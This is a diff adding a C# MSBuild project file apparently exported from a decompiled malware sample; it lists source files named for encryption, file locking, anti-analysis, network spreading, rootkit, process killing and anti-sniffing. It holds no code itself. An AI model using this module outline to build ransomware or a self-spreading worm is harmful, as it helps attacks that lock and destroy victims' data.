@@ -1,0 +1,67 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!--Project was exported from assembly: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d-->
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{F3B49EA3-A8AA-41D3-83E7-8D09C2D7A266}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>Client-2</AssemblyName>
+    <ApplicationVersion>0.0.0.0</ApplicationVersion>
+    <RootNamespace>Complex</RootNamespace>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Program.cs" />
+    <Compile Include="Crypto.cs" />
+    <Compile Include="LockedFiles.cs" />
+    <Compile Include="Anti_Analysis.cs" />
+    <Compile Include="ProcessCritical.cs" />
+    <Compile Include="Wallpaper.cs" />
+    <Compile Include="AwakeMe.cs" />
+    <Compile Include="NetworkSpreading.cs" />
+    <Compile Include="AntiKill.cs" />
+    <Compile Include="UtilMe.cs" />
+    <Compile Include="MutexHelper.cs" />
+    <Compile Include="CryptographyHelper.cs" />
+    <Compile Include="WakeOnLan.cs" />
+    <Compile Include="IPInfo.cs" />
+    <Compile Include="NetScan.cs" />
+    <Compile Include="Encryptions.cs" />
+    <Compile Include="RIP.cs" />
+    <Compile Include="Rootkit.cs" />
+    <Compile Include="Shortcut.cs" />
+    <Compile Include="ProcessKiller.cs" />
+    <Compile Include="AntiSniffer.cs" />
+    <Compile Include="Blocks.cs" />
+    <Compile Include="cvew\ROOT1.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
+</Project>
